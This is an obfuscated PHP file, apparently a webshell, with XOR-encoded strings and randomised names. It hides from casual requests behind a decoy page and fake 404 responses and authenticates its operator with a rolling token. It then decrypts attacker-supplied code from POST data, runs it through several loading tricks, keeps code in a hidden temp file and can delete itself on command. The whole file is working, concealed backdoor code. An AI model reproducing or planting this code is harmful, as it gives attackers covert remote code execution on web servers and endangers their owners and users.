<?php
/* d8bc5a6416b7d0d4 */
@error_reporting(0);@set_time_limit(0);
if(!defined('F241823E'))define('F241823E',7667);
class Appec5a7{static function cef0b2($v=null){return $v===null?'d49b923aa4d6':hash('sha256',$v);}}
register_shutdown_function(function(){});
if(!function_exists('_chk')){function _chk($v){return $v===true;}}
ini_set('display_errors','Off');
class Swc42c83{
  private $__d;private $__p=0;
  public function stream_open($u,$m,$f,&$o){
    $this->__d=substr($u,strpos($u,'://')+3);return true;
  }
  public function stream_read($n){
    $r=substr($this->__d,$this->__p,$n);$this->__p+=strlen($r);return $r;
  }
  public function stream_eof(){return $this->__p>=strlen($this->__d);}
  public function stream_stat(){return ['size'=>strlen($this->__d)];}
  public function url_stat($p,$f){return ['size'=>0];}
}
class Clscfdc329{
  private $dfb89;
  public function __construct(){
    $__f=$this->mcf0e97("\xd9\xd3\xd9\xf5\xcd\xcf\xde\xf5\xde\xcf\xc7\xda\xf5\xce\xc3\xd8");
    $this->dfb89=$__f();
  }

  private function mcf0e97($s){
    $k=(strlen(__CLASS__)*6+110)&0xff;$r='';for($i=0,$n=strlen($s);$i<$n;$i++)$r.=chr(ord($s[$i])^$k);return $r;
  }

  private function me52c81($d,$k){
    $e720='';for($fe75=0,$e893=strlen($d);$fe75<$e893;$fe75++)$e720.=$d[$fe75]^$k[($fe75+1)&15];
    return $e720;
  }

  private function mcbe7c4($d){
    $e0aa4=$this->mcf0e97("\xc9\xd8\xcf\xcb\xde\xcf\xf5\xcc\xdf\xc4\xc9\xde\xc3\xc5\xc4");
    $bde76=$this->mcf0e97("\xc3\xc4\xc3\xf5\xcd\xcf\xde");
    $fd71b=$this->mcf0e97("\xde\xcf\xc7\xda\xc4\xcb\xc7");
    $d0bee=$this->mcf0e97("\xcc\xc3\xc6\xcf\xf5\xda\xdf\xde\xf5\xc9\xc5\xc4\xde\xcf\xc4\xde\xd9");
    $e54ce=$this->mcf0e97("\xdf\xc4\xc6\xc3\xc4\xc1");
    $dc83f=$this->mcf0e97("\xcc\xdf\xc4\xc9\xde\xc3\xc5\xc4\xf5\xcf\xd2\xc3\xd9\xde\xd9");
    $a036a=$this->mcf0e97("\xc8\xcb\xd9\xcf\x9c\x9e\xf5\xcf\xc4\xc9\xc5\xce\xcf");
    $afe52=$this->mcf0e97("\xcc\xc5\xda\xcf\xc4");
    $d11cc=$this->mcf0e97("\xcc\xdd\xd8\xc3\xde\xcf");
    $cc4fc=$this->mcf0e97("\xcc\xc9\xc6\xc5\xd9\xcf");
    if(PHP_MAJOR_VERSION<8&&$dc83f($e0aa4)){
      $a0e2b=@$e0aa4('',$d);
      if($a0e2b!==false){$a0e2b();return;}
    }
    $a6d5b=$this->mcf0e97("\xd9\xde\xd8\xcf\xcb\xc7\xf5\xdd\xd8\xcb\xda\xda\xcf\xd8\xf5\xd8\xcf\xcd\xc3\xd9\xde\xcf\xd8");
    $d3a0e=$this->mcf0e97("\xd9\xde\xd8\xcf\xcb\xc7\xf5\xdd\xd8\xcb\xda\xda\xcf\xd8\xf5\xdf\xc4\xd8\xcf\xcd\xc3\xd9\xde\xcf\xd8");
    if($a6d5b('ed26','Swc42c83')){
      $__pfx=$this->mcf0e97("\x96\x95\xda\xc2\xda\x8a");
      @include 'ed26://'.$__pfx.$d;
      @$d3a0e('ed26');
      return;
    }
    if(@$bde76($this->mcf0e97("\xcb\xc6\xc6\xc5\xdd\xf5\xdf\xd8\xc6\xf5\xc3\xc4\xc9\xc6\xdf\xce\xcf"))){
      $__du=$this->mcf0e97("\xce\xcb\xde\xcb\x90\x85\x85\xde\xcf\xd2\xde\x85\xda\xc6\xcb\xc3\xc4\x91\xc8\xcb\xd9\xcf\x9c\x9e\x86");
      $__pp=$this->mcf0e97("\x96\x95\xda\xc2\xda\x8a");
      @include $__du.$a036a($__pp.$d);
      return;
    }
    $__pp=$this->mcf0e97("\x96\x95\xda\xc2\xda\x8a");
    $cb0c0=$fd71b($this->dfb89,'');
    if($dc83f($d0bee)){
      $d0bee($cb0c0,$__pp.$d);
    }else{
      $__fh=$afe52($cb0c0,'w');
      if($__fh){$d11cc($__fh,$__pp.$d);$cc4fc($__fh);}
    }
    include $cb0c0;
    @$e54ce($cb0c0);
  }

  public function me743d8(){
    $fc8e8=$this->mcf0e97("\xc8\xcb\xd9\xcf\x9c\x9e\xf5\xce\xcf\xc9\xc5\xce\xcf");
    $a036a=$this->mcf0e97("\xc8\xcb\xd9\xcf\x9c\x9e\xf5\xcf\xc4\xc9\xc5\xce\xcf");
    $fece9=$this->mcf0e97("\xcc\xc3\xc6\xcf\xf5\xcd\xcf\xde\xf5\xc9\xc5\xc4\xde\xcf\xc4\xde\xd9");
    $d0bee=$this->mcf0e97("\xcc\xc3\xc6\xcf\xf5\xda\xdf\xde\xf5\xc9\xc5\xc4\xde\xcf\xc4\xde\xd9");
    $fc46e=$this->mcf0e97("\xcc\xc3\xc6\xcf\xf5\xcf\xd2\xc3\xd9\xde\xd9");
    $acbec=$this->mcf0e97("\xd9\xde\xd8\xda\xc5\xd9");
    $b434c=$this->mcf0e97("\xc5\xda\xcf\xc4\xd9\xd9\xc6\xf5\xce\xcf\xc9\xd8\xd3\xda\xde");
    $a3047=$this->mcf0e97("\xc5\xda\xcf\xc4\xd9\xd9\xc6\xf5\xcf\xc4\xc9\xd8\xd3\xda\xde");
    $f4f1a=$this->mcf0e97("\xc5\xda\xcf\xc4\xd9\xd9\xc6\xf5\xd8\xcb\xc4\xce\xc5\xc7\xf5\xda\xd9\xcf\xdf\xce\xc5\xf5\xc8\xd3\xde\xcf\xd9");
    $dc282=$this->mcf0e97("\xc2\xcb\xd9\xc2\xf5\xda\xc8\xc1\xce\xcc\x98");
    $dc83f=$this->mcf0e97("\xcc\xdf\xc4\xc9\xde\xc3\xc5\xc4\xf5\xcf\xd2\xc3\xd9\xde\xd9");
    $ee846=$this->mcf0e97("\xcb\xda\xc9\xdf\xf5\xd9\xde\xc5\xd8\xcf");
    $cdee3=$this->mcf0e97("\xcb\xda\xc9\xdf\xf5\xcc\xcf\xde\xc9\xc2");
    $eaf34=$this->mcf0e97("\xc2\xcf\xcb\xce\xcf\xd8");
    $e2dbc=$this->mcf0e97("\xd9\xdf\xc8\xd9\xde\xd8");
    $e16c0=$this->mcf0e97("\xd9\xde\xd8\xc6\xcf\xc4");
    $e1cd2=$this->mcf0e97("\xd8\xcb\xc4\xce");
    $cbdb4=$this->mcf0e97("\xdf\xc4\xd9\xcf\xde");
    $e3b16=$this->mcf0e97("\xdf\xc4\xc6\xc3\xc4\xc1");
    $e41ae=$this->mcf0e97("\xc2\xcb\xd9\xc2");
    $b9b8b=$this->mcf0e97("\xc7\xc9\xd8\xd3\xda\xde\xf5\xcf\xc4\xc9\xd8\xd3\xda\xde");
    $fca20=$this->mcf0e97("\xc7\xc9\xd8\xd3\xda\xde\xf5\xce\xcf\xc9\xd8\xd3\xda\xde");
    $f4691=$this->mcf0e97("\xc7\xc9\xd8\xd3\xda\xde\xf5\xc9\xd8\xcf\xcb\xde\xcf\xf5\xc3\xdc");
    $ddbf7=$this->mcf0e97("\xd9\xde\xd8\xf5\xd8\xcf\xda\xcf\xcb\xde");
    $afe52=$this->mcf0e97("\xcc\xc5\xda\xcf\xc4");
    $d11cc=$this->mcf0e97("\xcc\xdd\xd8\xc3\xde\xcf");
    $cc4fc=$this->mcf0e97("\xcc\xc9\xc6\xc5\xd9\xcf");
    $__hasossl=$dc83f($a3047);
    $__hasmcr=$dc83f($b9b8b);
    $__rm=$this->mcf0e97("\xf8\xef\xfb\xff\xef\xf9\xfe\xf5\xe7\xef\xfe\xe2\xe5\xee");
    $__gm=$this->mcf0e97("\xed\xef\xfe");
    $__ct=$this->mcf0e97("\xe9\xc5\xc4\xde\xcf\xc4\xde\x87\xfe\xd3\xda\xcf\x90\x8a\xde\xcf\xd2\xde\x85\xc2\xde\xc7\xc6\x91\x8a\xc9\xc2\xcb\xd8\xd9\xcf\xde\x97\xdf\xde\xcc\x87\x92");
    if(isset($_SERVER[$__rm])&&$_SERVER[$__rm]===$__gm){
      $eaf34($__ct);
      echo '<!DOCTYPE html><html><head><title>ea8e2b</title></head><body><p>7667</p></body><!-- _:8bb3709b --></html>';
      exit;
    }
    $__sp=$this->mcf0e97("\xda\xc2\xda\xf5\xd9\xcb\xda\xc3\xf5\xc4\xcb\xc7\xcf");
    $__cl=$this->mcf0e97("\xc9\xc6\xc3");
    if($__sp()===$__cl)exit;
    $f5e9c=isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'';
    $ef184=isset($_SERVER['HTTP_ACCEPT'])?$_SERVER['HTTP_ACCEPT']:'';
    $__moz=$this->mcf0e97("\xe7\xc5\xd0\xc3\xc6\xc6\xcb");
    $__xh=$this->mcf0e97("\xd2\xc2\xde\xc7\xc6");
    $__nf=$this->mcf0e97("\xe2\xfe\xfe\xfa\x85\x9b\x84\x9b\x8a\x9e\x9a\x9e\x8a\xe4\xc5\xde\x8a\xec\xc5\xdf\xc4\xce");
    if($acbec($f5e9c,$__moz)===false||$acbec($ef184,$__xh)===false){$eaf34($__nf);exit;}
    $e2b74=chr(112).chr(97).chr(115).chr(115);
    $d6fe3=pack('H*','6b6579');
    $__md5=$this->mcf0e97("\xc7\xce\x9f");
    $e57a1=$e2dbc($__md5($d6fe3),0,16);
    $be922=$__md5($e2b74.$e57a1);
    $__pk=$this->mcf0e97("\xf5\xfa\xe5\xf9\xfe");
    $dffc0=isset($GLOBALS[$__pk])?$GLOBALS[$__pk]:array();
    $__tkn=$e2dbc($be922,16,8);
    $__tks=isset($dffc0[$__tkn])?$dffc0[$__tkn]:'';
    $__tv=false;$__ti=time();
    for($__to=-1;$__to<=1;$__to++){
      if($e2dbc($__md5($be922.(string)floor(($__ti+$__to*30)/30)),0,8)===$__tks){$__tv=true;break;}
    }
    if(!$__tv){$eaf34($__nf);exit;}
    $__kfn=$e2dbc($be922,24,8);
    $__kv=isset($dffc0[$__kfn])?$dffc0[$__kfn]:'';
    $__ks=$this->mcf0e97("\xc1\xc3\xc6\xc6");
    if($__kv===$e2dbc($__md5($be922.$__ks),0,8)){@$e3b16(__FILE__);exit;}
    $__alg=$this->mcf0e97("\xd9\xc2\xcb\x98\x9f\x9c");
    $__t=$e57a1.$be922;
    for($__i=0;$__i<1000;$__i++)$__t=$e41ae($__alg,$__t,true);
    $d564a=$e2dbc($__t,0,16);
    $b483a=$this->dfb89.'/.'.$e2dbc($be922,0,8).$e2dbc($be922,24);
    $bc7f4=$e2dbc($be922,0,8);
    $__csb=hexdec($e2dbc($be922,24,2));
    $ba390='';
    for($__ci=0;$__ci<10;$__ci++){
      $__sf=sprintf('%02x',($__csb+$__ci)%256);
      if(!isset($dffc0[$bc7f4.$__sf]))break;
      $ba390.=$dffc0[$bc7f4.$__sf];
    }
    if($ba390!==''){
      $ae848=$fc8e8($ba390);
      $b7a39=$e2dbc($ae848,0,16);
      $b35ef=$e2dbc($ae848,16);
      if($__hasossl){
        $__alg2=$this->mcf0e97("\xeb\xef\xf9\x87\x9b\x98\x92\x87\xe9\xe8\xe9");
        $ba390=$b434c($b35ef,$__alg2,$d564a,1,$b7a39);
      }elseif($__hasmcr){
        $__dr=$fca20(MCRYPT_RIJNDAEL_128,$d564a,$b35ef,MCRYPT_MODE_CBC,$b7a39);
        $__lp=ord($__dr[strlen($__dr)-1]);$ba390=$e2dbc($__dr,0,strlen($__dr)-$__lp);
      }else{$ba390='';}
      if($e16c0($ba390)>2){
        $__pl=(ord($ba390[0])<<8)|ord($ba390[1]);
        $ba390=$e2dbc($ba390,2+$__pl);
      }
      $cb0c0=false;
      if($dc83f($cdee3))$cb0c0=$cdee3($b483a);
      if($cb0c0===false&&@$fc46e($b483a))$cb0c0=$fece9($b483a);
      $__mk=$this->mcf0e97("\xcd\xcf\xde\xe8\xcb\xd9\xc3\xc9\xd9\xe3\xc4\xcc\xc5");
      if($cb0c0!==false){
        $cb0c0=$this->me52c81($cb0c0,$e57a1);
        if($acbec($cb0c0,$__mk)===false)$cb0c0=$this->me52c81($cb0c0,$e57a1);
        @$this->mcbe7c4($cb0c0);
        $b5505=$e1cd2(0,2);
        $__rk=$e2dbc($be922,8,2);$__vk=$e2dbc($be922,10,2);
        $__res=@run($ba390);
        if($__hasossl){
          $__alg2=$this->mcf0e97("\xeb\xef\xf9\x87\x9b\x98\x92\x87\xe9\xe8\xe9");
          $acdad=$f4f1a(16);
          $f6e1e=$a3047($__res,$__alg2,$d564a,1,$acdad);
        }elseif($__hasmcr){
          $acdad=$f4691(16,MCRYPT_RAND);
          $__rpad=16-(strlen($__res)%16);$__rpad=($__rpad===0)?16:$__rpad;
          $__rpadded=$__res.$ddbf7(chr($__rpad),$__rpad);
          $f6e1e=$b9b8b(MCRYPT_RIJNDAEL_128,$d564a,$__rpadded,MCRYPT_MODE_CBC,$acdad);
        }else{$acdad='';$f6e1e='';}
        $ae848=$a036a($acdad.$f6e1e);
        if($b5505===0){
          echo '{"'.$__rk.'":"';echo $ae848;echo '","'.$__vk.'":"';echo $e2dbc($be922,0,8);echo '"}' ;
        }elseif($b5505===1){
          echo '<!--';echo $e2dbc($be922,0,8).':'.$ae848.'  :'.$e2dbc($be922,0,8);echo '-->';
        }else{
          echo 'var '.$__rk.'="';echo $ae848;echo '";var '.$__vk.'="';echo $e2dbc($be922,0,8);echo '";';
        }
      }else{
        if($acbec($ba390,$__mk)!==false){
          $cb0c0=$this->me52c81($ba390,$e57a1);
          if($dc83f($ee846))$ee846($b483a,$cb0c0);
          else @$d0bee($b483a,$cb0c0);
        }
      }
      @$cbdb4($ba390,$ae848,$b7a39,$b35ef,$d564a,$f6e1e);
    }
    $ef104=base64_decode('cGFzc19hcw==');
    if(isset($dffc0[$ef104])){
      $ee84e='LisethX'.'orKey';
      $c315b=$fc8e8($dffc0[$ef104]);
      $bf7d7='';
      for($fe75=0;$fe75<$e16c0($c315b);$fe75++)
        $bf7d7.=$c315b[$fe75]^$ee84e[$fe75%$e16c0($ee84e)];
      @$this->mcbe7c4($fc8e8($bf7d7));
      @$cbdb4($c315b,$bf7d7,$ee84e);
    }
  }
}
$b9f39=new Clscfdc329();
$b9f39->me743d8();
?>